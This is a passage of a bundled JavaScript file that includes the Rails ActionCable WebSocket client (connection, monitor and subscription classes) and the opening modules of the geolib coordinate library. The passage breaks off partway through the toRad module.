(() => {
  var __create = Object.create;
  var __defProp = Object.defineProperty;
  var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
  var __getOwnPropNames = Object.getOwnPropertyNames;
  var __getProtoOf = Object.getPrototypeOf;
  var __hasOwnProp = Object.prototype.hasOwnProperty;
  var __esm = (fn, res) => function __init() {
    return fn && (res = (0, fn[__getOwnPropNames(fn)[0]])(fn = 0)), res;
  };
  var __commonJS = (cb, mod) => function __require() {
    return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
  };
  var __export = (target, all3) => {
    for (var name in all3)
      __defProp(target, name, { get: all3[name], enumerable: true });
  };
  var __copyProps = (to, from, except, desc) => {
    if (from && typeof from === "object" || typeof from === "function") {
      for (let key of __getOwnPropNames(from))
        if (!__hasOwnProp.call(to, key) && key !== except)
          __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
    }
    return to;
  };
  var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
    // If the importer is in node compatibility mode or this is not an ESM
    // file that has been converted to a CommonJS file using a Babel-
    // compatible transform (i.e. "__esModule" has not been set), then set
    // "default" to the CommonJS "module.exports" for node compatibility.
    isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
    mod
  ));

  // node_modules/@rails/actioncable/src/adapters.js
  var adapters_default;
  var init_adapters = __esm({
    "node_modules/@rails/actioncable/src/adapters.js"() {
      adapters_default = {
        logger: self.console,
        WebSocket: self.WebSocket
      };
    }
  });

  // node_modules/@rails/actioncable/src/logger.js
  var logger_default;
  var init_logger = __esm({
    "node_modules/@rails/actioncable/src/logger.js"() {
      init_adapters();
      logger_default = {
        log(...messages) {
          if (this.enabled) {
            messages.push(Date.now());
            adapters_default.logger.log("[ActionCable]", ...messages);
          }
        }
      };
    }
  });

  // node_modules/@rails/actioncable/src/connection_monitor.js
  var now, secondsSince, ConnectionMonitor, connection_monitor_default;
  var init_connection_monitor = __esm({
    "node_modules/@rails/actioncable/src/connection_monitor.js"() {
      init_logger();
      now = () => (/* @__PURE__ */ new Date()).getTime();
      secondsSince = (time) => (now() - time) / 1e3;
      ConnectionMonitor = class {
        constructor(connection) {
          this.visibilityDidChange = this.visibilityDidChange.bind(this);
          this.connection = connection;
          this.reconnectAttempts = 0;
        }
        start() {
          if (!this.isRunning()) {
            this.startedAt = now();
            delete this.stoppedAt;
            this.startPolling();
            addEventListener("visibilitychange", this.visibilityDidChange);
            logger_default.log(`ConnectionMonitor started. stale threshold = ${this.constructor.staleThreshold} s`);
          }
        }
        stop() {
          if (this.isRunning()) {
            this.stoppedAt = now();
            this.stopPolling();
            removeEventListener("visibilitychange", this.visibilityDidChange);
            logger_default.log("ConnectionMonitor stopped");
          }
        }
        isRunning() {
          return this.startedAt && !this.stoppedAt;
        }
        recordPing() {
          this.pingedAt = now();
        }
        recordConnect() {
          this.reconnectAttempts = 0;
          this.recordPing();
          delete this.disconnectedAt;
          logger_default.log("ConnectionMonitor recorded connect");
        }
        recordDisconnect() {
          this.disconnectedAt = now();
          logger_default.log("ConnectionMonitor recorded disconnect");
        }
        // Private
        startPolling() {
          this.stopPolling();
          this.poll();
        }
        stopPolling() {
          clearTimeout(this.pollTimeout);
        }
        poll() {
          this.pollTimeout = setTimeout(
            () => {
              this.reconnectIfStale();
              this.poll();
            },
            this.getPollInterval()
          );
        }
        getPollInterval() {
          const { staleThreshold, reconnectionBackoffRate } = this.constructor;
          const backoff = Math.pow(1 + reconnectionBackoffRate, Math.min(this.reconnectAttempts, 10));
          const jitterMax = this.reconnectAttempts === 0 ? 1 : reconnectionBackoffRate;
          const jitter = jitterMax * Math.random();
          return staleThreshold * 1e3 * backoff * (1 + jitter);
        }
        reconnectIfStale() {
          if (this.connectionIsStale()) {
            logger_default.log(`ConnectionMonitor detected stale connection. reconnectAttempts = ${this.reconnectAttempts}, time stale = ${secondsSince(this.refreshedAt)} s, stale threshold = ${this.constructor.staleThreshold} s`);
            this.reconnectAttempts++;
            if (this.disconnectedRecently()) {
              logger_default.log(`ConnectionMonitor skipping reopening recent disconnect. time disconnected = ${secondsSince(this.disconnectedAt)} s`);
            } else {
              logger_default.log("ConnectionMonitor reopening");
              this.connection.reopen();
            }
          }
        }
        get refreshedAt() {
          return this.pingedAt ? this.pingedAt : this.startedAt;
        }
        connectionIsStale() {
          return secondsSince(this.refreshedAt) > this.constructor.staleThreshold;
        }
        disconnectedRecently() {
          return this.disconnectedAt && secondsSince(this.disconnectedAt) < this.constructor.staleThreshold;
        }
        visibilityDidChange() {
          if (document.visibilityState === "visible") {
            setTimeout(
              () => {
                if (this.connectionIsStale() || !this.connection.isOpen()) {
                  logger_default.log(`ConnectionMonitor reopening stale connection on visibilitychange. visibilityState = ${document.visibilityState}`);
                  this.connection.reopen();
                }
              },
              200
            );
          }
        }
      };
      ConnectionMonitor.staleThreshold = 6;
      ConnectionMonitor.reconnectionBackoffRate = 0.15;
      connection_monitor_default = ConnectionMonitor;
    }
  });

  // node_modules/@rails/actioncable/src/internal.js
  var internal_default;
  var init_internal = __esm({
    "node_modules/@rails/actioncable/src/internal.js"() {
      internal_default = {
        "message_types": {
          "welcome": "welcome",
          "disconnect": "disconnect",
          "ping": "ping",
          "confirmation": "confirm_subscription",
          "rejection": "reject_subscription"
        },
        "disconnect_reasons": {
          "unauthorized": "unauthorized",
          "invalid_request": "invalid_request",
          "server_restart": "server_restart",
          "remote": "remote"
        },
        "default_mount_path": "/cable",
        "protocols": [
          "actioncable-v1-json",
          "actioncable-unsupported"
        ]
      };
    }
  });

  // node_modules/@rails/actioncable/src/connection.js
  var message_types, protocols, supportedProtocols, indexOf, Connection, connection_default;
  var init_connection = __esm({
    "node_modules/@rails/actioncable/src/connection.js"() {
      init_adapters();
      init_connection_monitor();
      init_internal();
      init_logger();
      ({ message_types, protocols } = internal_default);
      supportedProtocols = protocols.slice(0, protocols.length - 1);
      indexOf = [].indexOf;
      Connection = class {
        constructor(consumer2) {
          this.open = this.open.bind(this);
          this.consumer = consumer2;
          this.subscriptions = this.consumer.subscriptions;
          this.monitor = new connection_monitor_default(this);
          this.disconnected = true;
        }
        send(data) {
          if (this.isOpen()) {
            this.webSocket.send(JSON.stringify(data));
            return true;
          } else {
            return false;
          }
        }
        open() {
          if (this.isActive()) {
            logger_default.log(`Attempted to open WebSocket, but existing socket is ${this.getState()}`);
            return false;
          } else {
            const socketProtocols = [...protocols, ...this.consumer.subprotocols || []];
            logger_default.log(`Opening WebSocket, current state is ${this.getState()}, subprotocols: ${socketProtocols}`);
            if (this.webSocket) {
              this.uninstallEventHandlers();
            }
            this.webSocket = new adapters_default.WebSocket(this.consumer.url, socketProtocols);
            this.installEventHandlers();
            this.monitor.start();
            return true;
          }
        }
        close({ allowReconnect } = { allowReconnect: true }) {
          if (!allowReconnect) {
            this.monitor.stop();
          }
          if (this.isOpen()) {
            return this.webSocket.close();
          }
        }
        reopen() {
          logger_default.log(`Reopening WebSocket, current state is ${this.getState()}`);
          if (this.isActive()) {
            try {
              return this.close();
            } catch (error2) {
              logger_default.log("Failed to reopen WebSocket", error2);
            } finally {
              logger_default.log(`Reopening WebSocket in ${this.constructor.reopenDelay}ms`);
              setTimeout(this.open, this.constructor.reopenDelay);
            }
          } else {
            return this.open();
          }
        }
        getProtocol() {
          if (this.webSocket) {
            return this.webSocket.protocol;
          }
        }
        isOpen() {
          return this.isState("open");
        }
        isActive() {
          return this.isState("open", "connecting");
        }
        triedToReconnect() {
          return this.monitor.reconnectAttempts > 0;
        }
        // Private
        isProtocolSupported() {
          return indexOf.call(supportedProtocols, this.getProtocol()) >= 0;
        }
        isState(...states) {
          return indexOf.call(states, this.getState()) >= 0;
        }
        getState() {
          if (this.webSocket) {
            for (let state in adapters_default.WebSocket) {
              if (adapters_default.WebSocket[state] === this.webSocket.readyState) {
                return state.toLowerCase();
              }
            }
          }
          return null;
        }
        installEventHandlers() {
          for (let eventName in this.events) {
            const handler = this.events[eventName].bind(this);
            this.webSocket[`on${eventName}`] = handler;
          }
        }
        uninstallEventHandlers() {
          for (let eventName in this.events) {
            this.webSocket[`on${eventName}`] = function() {
            };
          }
        }
      };
      Connection.reopenDelay = 500;
      Connection.prototype.events = {
        message(event) {
          if (!this.isProtocolSupported()) {
            return;
          }
          const { identifier, message, reason, reconnect, type } = JSON.parse(event.data);
          switch (type) {
            case message_types.welcome:
              if (this.triedToReconnect()) {
                this.reconnectAttempted = true;
              }
              this.monitor.recordConnect();
              return this.subscriptions.reload();
            case message_types.disconnect:
              logger_default.log(`Disconnecting. Reason: ${reason}`);
              return this.close({ allowReconnect: reconnect });
            case message_types.ping:
              return this.monitor.recordPing();
            case message_types.confirmation:
              this.subscriptions.confirmSubscription(identifier);
              if (this.reconnectAttempted) {
                this.reconnectAttempted = false;
                return this.subscriptions.notify(identifier, "connected", { reconnected: true });
              } else {
                return this.subscriptions.notify(identifier, "connected", { reconnected: false });
              }
            case message_types.rejection:
              return this.subscriptions.reject(identifier);
            default:
              return this.subscriptions.notify(identifier, "received", message);
          }
        },
        open() {
          logger_default.log(`WebSocket onopen event, using '${this.getProtocol()}' subprotocol`);
          this.disconnected = false;
          if (!this.isProtocolSupported()) {
            logger_default.log("Protocol is unsupported. Stopping monitor and disconnecting.");
            return this.close({ allowReconnect: false });
          }
        },
        close(event) {
          logger_default.log("WebSocket onclose event");
          if (this.disconnected) {
            return;
          }
          this.disconnected = true;
          this.monitor.recordDisconnect();
          return this.subscriptions.notifyAll("disconnected", { willAttemptReconnect: this.monitor.isRunning() });
        },
        error() {
          logger_default.log("WebSocket onerror event");
        }
      };
      connection_default = Connection;
    }
  });

  // node_modules/@rails/actioncable/src/subscription.js
  var extend, Subscription;
  var init_subscription = __esm({
    "node_modules/@rails/actioncable/src/subscription.js"() {
      extend = function(object, properties) {
        if (properties != null) {
          for (let key in properties) {
            const value = properties[key];
            object[key] = value;
          }
        }
        return object;
      };
      Subscription = class {
        constructor(consumer2, params = {}, mixin) {
          this.consumer = consumer2;
          this.identifier = JSON.stringify(params);
          extend(this, mixin);
        }
        // Perform a channel action with the optional data passed as an attribute
        perform(action, data = {}) {
          data.action = action;
          return this.send(data);
        }
        send(data) {
          return this.consumer.send({ command: "message", identifier: this.identifier, data: JSON.stringify(data) });
        }
        unsubscribe() {
          return this.consumer.subscriptions.remove(this);
        }
      };
    }
  });

  // node_modules/@rails/actioncable/src/subscription_guarantor.js
  var SubscriptionGuarantor, subscription_guarantor_default;
  var init_subscription_guarantor = __esm({
    "node_modules/@rails/actioncable/src/subscription_guarantor.js"() {
      init_logger();
      SubscriptionGuarantor = class {
        constructor(subscriptions) {
          this.subscriptions = subscriptions;
          this.pendingSubscriptions = [];
        }
        guarantee(subscription) {
          if (this.pendingSubscriptions.indexOf(subscription) == -1) {
            logger_default.log(`SubscriptionGuarantor guaranteeing ${subscription.identifier}`);
            this.pendingSubscriptions.push(subscription);
          } else {
            logger_default.log(`SubscriptionGuarantor already guaranteeing ${subscription.identifier}`);
          }
          this.startGuaranteeing();
        }
        forget(subscription) {
          logger_default.log(`SubscriptionGuarantor forgetting ${subscription.identifier}`);
          this.pendingSubscriptions = this.pendingSubscriptions.filter((s) => s !== subscription);
        }
        startGuaranteeing() {
          this.stopGuaranteeing();
          this.retrySubscribing();
        }
        stopGuaranteeing() {
          clearTimeout(this.retryTimeout);
        }
        retrySubscribing() {
          this.retryTimeout = setTimeout(
            () => {
              if (this.subscriptions && typeof this.subscriptions.subscribe === "function") {
                this.pendingSubscriptions.map((subscription) => {
                  logger_default.log(`SubscriptionGuarantor resubscribing ${subscription.identifier}`);
                  this.subscriptions.subscribe(subscription);
                });
              }
            },
            500
          );
        }
      };
      subscription_guarantor_default = SubscriptionGuarantor;
    }
  });

  // node_modules/@rails/actioncable/src/subscriptions.js
  var Subscriptions;
  var init_subscriptions = __esm({
    "node_modules/@rails/actioncable/src/subscriptions.js"() {
      init_subscription();
      init_subscription_guarantor();
      init_logger();
      Subscriptions = class {
        constructor(consumer2) {
          this.consumer = consumer2;
          this.guarantor = new subscription_guarantor_default(this);
          this.subscriptions = [];
        }
        create(channelName, mixin) {
          const channel = channelName;
          const params = typeof channel === "object" ? channel : { channel };
          const subscription = new Subscription(this.consumer, params, mixin);
          return this.add(subscription);
        }
        // Private
        add(subscription) {
          this.subscriptions.push(subscription);
          this.consumer.ensureActiveConnection();
          this.notify(subscription, "initialized");
          this.subscribe(subscription);
          return subscription;
        }
        remove(subscription) {
          this.forget(subscription);
          if (!this.findAll(subscription.identifier).length) {
            this.sendCommand(subscription, "unsubscribe");
          }
          return subscription;
        }
        reject(identifier) {
          return this.findAll(identifier).map((subscription) => {
            this.forget(subscription);
            this.notify(subscription, "rejected");
            return subscription;
          });
        }
        forget(subscription) {
          this.guarantor.forget(subscription);
          this.subscriptions = this.subscriptions.filter((s) => s !== subscription);
          return subscription;
        }
        findAll(identifier) {
          return this.subscriptions.filter((s) => s.identifier === identifier);
        }
        reload() {
          return this.subscriptions.map((subscription) => this.subscribe(subscription));
        }
        notifyAll(callbackName, ...args) {
          return this.subscriptions.map((subscription) => this.notify(subscription, callbackName, ...args));
        }
        notify(subscription, callbackName, ...args) {
          let subscriptions;
          if (typeof subscription === "string") {
            subscriptions = this.findAll(subscription);
          } else {
            subscriptions = [subscription];
          }
          return subscriptions.map((subscription2) => typeof subscription2[callbackName] === "function" ? subscription2[callbackName](...args) : void 0);
        }
        subscribe(subscription) {
          if (this.sendCommand(subscription, "subscribe")) {
            this.guarantor.guarantee(subscription);
          }
        }
        confirmSubscription(identifier) {
          logger_default.log(`Subscription confirmed ${identifier}`);
          this.findAll(identifier).map((subscription) => this.guarantor.forget(subscription));
        }
        sendCommand(subscription, command) {
          const { identifier } = subscription;
          return this.consumer.send({ command, identifier });
        }
      };
    }
  });

  // node_modules/@rails/actioncable/src/consumer.js
  function createWebSocketURL(url) {
    if (typeof url === "function") {
      url = url();
    }
    if (url && !/^wss?:/i.test(url)) {
      const a = document.createElement("a");
      a.href = url;
      a.href = a.href;
      a.protocol = a.protocol.replace("http", "ws");
      return a.href;
    } else {
      return url;
    }
  }
  var Consumer;
  var init_consumer = __esm({
    "node_modules/@rails/actioncable/src/consumer.js"() {
      init_connection();
      init_subscriptions();
      Consumer = class {
        constructor(url) {
          this._url = url;
          this.subscriptions = new Subscriptions(this);
          this.connection = new connection_default(this);
          this.subprotocols = [];
        }
        get url() {
          return createWebSocketURL(this._url);
        }
        send(data) {
          return this.connection.send(data);
        }
        connect() {
          return this.connection.open();
        }
        disconnect() {
          return this.connection.close({ allowReconnect: false });
        }
        ensureActiveConnection() {
          if (!this.connection.isActive()) {
            return this.connection.open();
          }
        }
        addSubProtocol(subprotocol) {
          this.subprotocols = [...this.subprotocols, subprotocol];
        }
      };
    }
  });

  // node_modules/@rails/actioncable/src/index.js
  var src_exports = {};
  __export(src_exports, {
    Connection: () => connection_default,
    ConnectionMonitor: () => connection_monitor_default,
    Consumer: () => Consumer,
    INTERNAL: () => internal_default,
    Subscription: () => Subscription,
    SubscriptionGuarantor: () => subscription_guarantor_default,
    Subscriptions: () => Subscriptions,
    adapters: () => adapters_default,
    createConsumer: () => createConsumer,
    createWebSocketURL: () => createWebSocketURL,
    getConfig: () => getConfig,
    logger: () => logger_default
  });
  function createConsumer(url = getConfig("url") || internal_default.default_mount_path) {
    return new Consumer(url);
  }
  function getConfig(name) {
    const element = document.head.querySelector(`meta[name='action-cable-${name}']`);
    if (element) {
      return element.getAttribute("content");
    }
  }
  var init_src = __esm({
    "node_modules/@rails/actioncable/src/index.js"() {
      init_connection();
      init_connection_monitor();
      init_consumer();
      init_internal();
      init_subscription();
      init_subscriptions();
      init_subscription_guarantor();
      init_adapters();
      init_logger();
    }
  });

  // node_modules/geolib/es/constants.js
  var require_constants = __commonJS({
    "node_modules/geolib/es/constants.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.areaConversion = exports2.timeConversion = exports2.distanceConversion = exports2.altitudeKeys = exports2.latitudeKeys = exports2.longitudeKeys = exports2.MAXLON = exports2.MINLON = exports2.MAXLAT = exports2.MINLAT = exports2.earthRadius = exports2.sexagesimalPattern = void 0;
      var sexagesimalPattern = /^([0-9]{1,3})°\s*([0-9]{1,3}(?:\.(?:[0-9]{1,}))?)['′]\s*(([0-9]{1,3}(\.([0-9]{1,}))?)["″]\s*)?([NEOSW]?)$/;
      exports2.sexagesimalPattern = sexagesimalPattern;
      var earthRadius = 6378137;
      exports2.earthRadius = earthRadius;
      var MINLAT = -90;
      exports2.MINLAT = MINLAT;
      var MAXLAT = 90;
      exports2.MAXLAT = MAXLAT;
      var MINLON = -180;
      exports2.MINLON = MINLON;
      var MAXLON = 180;
      exports2.MAXLON = MAXLON;
      var longitudeKeys = ["lng", "lon", "longitude", 0];
      exports2.longitudeKeys = longitudeKeys;
      var latitudeKeys = ["lat", "latitude", 1];
      exports2.latitudeKeys = latitudeKeys;
      var altitudeKeys = ["alt", "altitude", "elevation", "elev", 2];
      exports2.altitudeKeys = altitudeKeys;
      var distanceConversion = { m: 1, km: 1e-3, cm: 100, mm: 1e3, mi: 1 / 1609.344, sm: 1 / 1852.216, ft: 100 / 30.48, in: 100 / 2.54, yd: 1 / 0.9144 };
      exports2.distanceConversion = distanceConversion;
      var timeConversion = { m: 60, h: 3600, d: 86400 };
      exports2.timeConversion = timeConversion;
      var areaConversion = { m2: 1, km2: 1e-6, ha: 1e-4, a: 0.01, ft2: 10.763911, yd2: 1.19599, in2: 1550.0031 };
      exports2.areaConversion = areaConversion;
      areaConversion.sqm = areaConversion.m2;
      areaConversion.sqkm = areaConversion.km2;
      areaConversion.sqft = areaConversion.ft2;
      areaConversion.sqyd = areaConversion.yd2;
      areaConversion.sqin = areaConversion.in2;
    }
  });

  // node_modules/geolib/es/getCoordinateKey.js
  var require_getCoordinateKey = __commonJS({
    "node_modules/geolib/es/getCoordinateKey.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var getCoordinateKey = function getCoordinateKey2(point, keysToLookup) {
        return keysToLookup.reduce(function(foundKey, key) {
          if (typeof point === "undefined" || point === null) {
            throw new Error("'".concat(point, "' is no valid coordinate."));
          }
          if (Object.prototype.hasOwnProperty.call(point, key) && typeof key !== "undefined" && typeof foundKey === "undefined") {
            foundKey = key;
            return key;
          }
          return foundKey;
        }, void 0);
      };
      var _default = getCoordinateKey;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/isDecimal.js
  var require_isDecimal = __commonJS({
    "node_modules/geolib/es/isDecimal.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var isDecimal = function isDecimal2(value) {
        var checkedValue = value.toString().trim();
        if (isNaN(parseFloat(checkedValue))) {
          return false;
        }
        return parseFloat(checkedValue) === Number(checkedValue);
      };
      var _default = isDecimal;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/isSexagesimal.js
  var require_isSexagesimal = __commonJS({
    "node_modules/geolib/es/isSexagesimal.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _constants = require_constants();
      var isSexagesimal = function isSexagesimal2(value) {
        return _constants.sexagesimalPattern.test(value.toString().trim());
      };
      var _default = isSexagesimal;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/sexagesimalToDecimal.js
  var require_sexagesimalToDecimal = __commonJS({
    "node_modules/geolib/es/sexagesimalToDecimal.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _constants = require_constants();
      var sexagesimalToDecimal = function sexagesimalToDecimal2(sexagesimal) {
        var data = new RegExp(_constants.sexagesimalPattern).exec(sexagesimal.toString().trim());
        if (typeof data === "undefined" || data === null) {
          throw new Error("Given value is not in sexagesimal format");
        }
        var min = Number(data[2]) / 60 || 0;
        var sec = Number(data[4]) / 3600 || 0;
        var decimal = parseFloat(data[1]) + min + sec;
        return ["S", "W"].includes(data[7]) ? -decimal : decimal;
      };
      var _default = sexagesimalToDecimal;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getCoordinateKeys.js
  var require_getCoordinateKeys = __commonJS({
    "node_modules/geolib/es/getCoordinateKeys.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _constants = require_constants();
      var _getCoordinateKey = _interopRequireDefault(require_getCoordinateKey());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      function ownKeys(object, enumerableOnly) {
        var keys = Object.keys(object);
        if (Object.getOwnPropertySymbols) {
          var symbols = Object.getOwnPropertySymbols(object);
          if (enumerableOnly)
            symbols = symbols.filter(function(sym) {
              return Object.getOwnPropertyDescriptor(object, sym).enumerable;
            });
          keys.push.apply(keys, symbols);
        }
        return keys;
      }
      function _objectSpread(target) {
        for (var i = 1; i < arguments.length; i++) {
          var source = arguments[i] != null ? arguments[i] : {};
          if (i % 2) {
            ownKeys(Object(source), true).forEach(function(key) {
              _defineProperty(target, key, source[key]);
            });
          } else if (Object.getOwnPropertyDescriptors) {
            Object.defineProperties(target, Object.getOwnPropertyDescriptors(source));
          } else {
            ownKeys(Object(source)).forEach(function(key) {
              Object.defineProperty(target, key, Object.getOwnPropertyDescriptor(source, key));
            });
          }
        }
        return target;
      }
      function _defineProperty(obj, key, value) {
        if (key in obj) {
          Object.defineProperty(obj, key, { value, enumerable: true, configurable: true, writable: true });
        } else {
          obj[key] = value;
        }
        return obj;
      }
      var getCoordinateKeys = function getCoordinateKeys2(point) {
        var keysToLookup = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : { longitude: _constants.longitudeKeys, latitude: _constants.latitudeKeys, altitude: _constants.altitudeKeys };
        var longitude = (0, _getCoordinateKey.default)(point, keysToLookup.longitude);
        var latitude = (0, _getCoordinateKey.default)(point, keysToLookup.latitude);
        var altitude = (0, _getCoordinateKey.default)(point, keysToLookup.altitude);
        return _objectSpread({ latitude, longitude }, altitude ? { altitude } : {});
      };
      var _default = getCoordinateKeys;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/isValidLatitude.js
  var require_isValidLatitude = __commonJS({
    "node_modules/geolib/es/isValidLatitude.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _isDecimal = _interopRequireDefault(require_isDecimal());
      var _isSexagesimal = _interopRequireDefault(require_isSexagesimal());
      var _sexagesimalToDecimal = _interopRequireDefault(require_sexagesimalToDecimal());
      var _constants = require_constants();
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var isValidLatitude = function isValidLatitude2(value) {
        if ((0, _isDecimal.default)(value)) {
          if (parseFloat(value) > _constants.MAXLAT || value < _constants.MINLAT) {
            return false;
          }
          return true;
        }
        if ((0, _isSexagesimal.default)(value)) {
          return isValidLatitude2((0, _sexagesimalToDecimal.default)(value));
        }
        return false;
      };
      var _default = isValidLatitude;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/isValidLongitude.js
  var require_isValidLongitude = __commonJS({
    "node_modules/geolib/es/isValidLongitude.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _isDecimal = _interopRequireDefault(require_isDecimal());
      var _isSexagesimal = _interopRequireDefault(require_isSexagesimal());
      var _sexagesimalToDecimal = _interopRequireDefault(require_sexagesimalToDecimal());
      var _constants = require_constants();
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var isValidLongitude = function isValidLongitude2(value) {
        if ((0, _isDecimal.default)(value)) {
          if (parseFloat(value) > _constants.MAXLON || value < _constants.MINLON) {
            return false;
          }
          return true;
        }
        if ((0, _isSexagesimal.default)(value)) {
          return isValidLongitude2((0, _sexagesimalToDecimal.default)(value));
        }
        return false;
      };
      var _default = isValidLongitude;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/isValidCoordinate.js
  var require_isValidCoordinate = __commonJS({
    "node_modules/geolib/es/isValidCoordinate.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getCoordinateKeys2 = _interopRequireDefault(require_getCoordinateKeys());
      var _isValidLatitude = _interopRequireDefault(require_isValidLatitude());
      var _isValidLongitude = _interopRequireDefault(require_isValidLongitude());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var isValidCoordinate = function isValidCoordinate2(point) {
        var _getCoordinateKeys = (0, _getCoordinateKeys2.default)(point), latitude = _getCoordinateKeys.latitude, longitude = _getCoordinateKeys.longitude;
        if (Array.isArray(point) && point.length >= 2) {
          return (0, _isValidLongitude.default)(point[0]) && (0, _isValidLatitude.default)(point[1]);
        }
        if (typeof latitude === "undefined" || typeof longitude === "undefined") {
          return false;
        }
        var lon = point[longitude];
        var lat = point[latitude];
        if (typeof lat === "undefined" || typeof lon === "undefined") {
          return false;
        }
        if ((0, _isValidLatitude.default)(lat) === false || (0, _isValidLongitude.default)(lon) === false) {
          return false;
        }
        return true;
      };
      var _default = isValidCoordinate;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/toDecimal.js
  var require_toDecimal = __commonJS({
    "node_modules/geolib/es/toDecimal.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _isDecimal = _interopRequireDefault(require_isDecimal());
      var _isSexagesimal = _interopRequireDefault(require_isSexagesimal());
      var _sexagesimalToDecimal = _interopRequireDefault(require_sexagesimalToDecimal());
      var _isValidCoordinate = _interopRequireDefault(require_isValidCoordinate());
      var _getCoordinateKeys = _interopRequireDefault(require_getCoordinateKeys());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      function ownKeys(object, enumerableOnly) {
        var keys = Object.keys(object);
        if (Object.getOwnPropertySymbols) {
          var symbols = Object.getOwnPropertySymbols(object);
          if (enumerableOnly)
            symbols = symbols.filter(function(sym) {
              return Object.getOwnPropertyDescriptor(object, sym).enumerable;
            });
          keys.push.apply(keys, symbols);
        }
        return keys;
      }
      function _objectSpread(target) {
        for (var i = 1; i < arguments.length; i++) {
          var source = arguments[i] != null ? arguments[i] : {};
          if (i % 2) {
            ownKeys(Object(source), true).forEach(function(key) {
              _defineProperty(target, key, source[key]);
            });
          } else if (Object.getOwnPropertyDescriptors) {
            Object.defineProperties(target, Object.getOwnPropertyDescriptors(source));
          } else {
            ownKeys(Object(source)).forEach(function(key) {
              Object.defineProperty(target, key, Object.getOwnPropertyDescriptor(source, key));
            });
          }
        }
        return target;
      }
      function _defineProperty(obj, key, value) {
        if (key in obj) {
          Object.defineProperty(obj, key, { value, enumerable: true, configurable: true, writable: true });
        } else {
          obj[key] = value;
        }
        return obj;
      }
      var toDecimal = function toDecimal2(value) {
        if ((0, _isDecimal.default)(value)) {
          return Number(value);
        }
        if ((0, _isSexagesimal.default)(value)) {
          return (0, _sexagesimalToDecimal.default)(value);
        }
        if ((0, _isValidCoordinate.default)(value)) {
          var keys = (0, _getCoordinateKeys.default)(value);
          if (Array.isArray(value)) {
            return value.map(function(v, index) {
              return [0, 1].includes(index) ? toDecimal2(v) : v;
            });
          }
          return _objectSpread(_objectSpread(_objectSpread({}, value), keys.latitude && _defineProperty({}, keys.latitude, toDecimal2(value[keys.latitude]))), keys.longitude && _defineProperty({}, keys.longitude, toDecimal2(value[keys.longitude])));
        }
        if (Array.isArray(value)) {
          return value.map(function(point) {
            return (0, _isValidCoordinate.default)(point) ? toDecimal2(point) : point;
          });
        }
        return value;
      };
      var _default = toDecimal;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getLatitude.js
  var require_getLatitude = __commonJS({
    "node_modules/geolib/es/getLatitude.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _constants = require_constants();
      var _getCoordinateKey = _interopRequireDefault(require_getCoordinateKey());
      var _toDecimal = _interopRequireDefault(require_toDecimal());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getLatitude = function getLatitude2(point, raw) {
        var latKey = (0, _getCoordinateKey.default)(point, _constants.latitudeKeys);
        if (typeof latKey === "undefined" || latKey === null) {
          return;
        }
        var value = point[latKey];
        return raw === true ? value : (0, _toDecimal.default)(value);
      };
      var _default = getLatitude;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getLongitude.js
  var require_getLongitude = __commonJS({
    "node_modules/geolib/es/getLongitude.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _constants = require_constants();
      var _getCoordinateKey = _interopRequireDefault(require_getCoordinateKey());
      var _toDecimal = _interopRequireDefault(require_toDecimal());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getLongitude = function getLongitude2(point, raw) {
        var latKey = (0, _getCoordinateKey.default)(point, _constants.longitudeKeys);
        if (typeof latKey === "undefined" || latKey === null) {
          return;
        }
        var value = point[latKey];
        return raw === true ? value : (0, _toDecimal.default)(value);
      };
      var _default = getLongitude;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/toRad.js
  var require_toRad = __commonJS({
    "node_modules/geolib/es/toRad.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
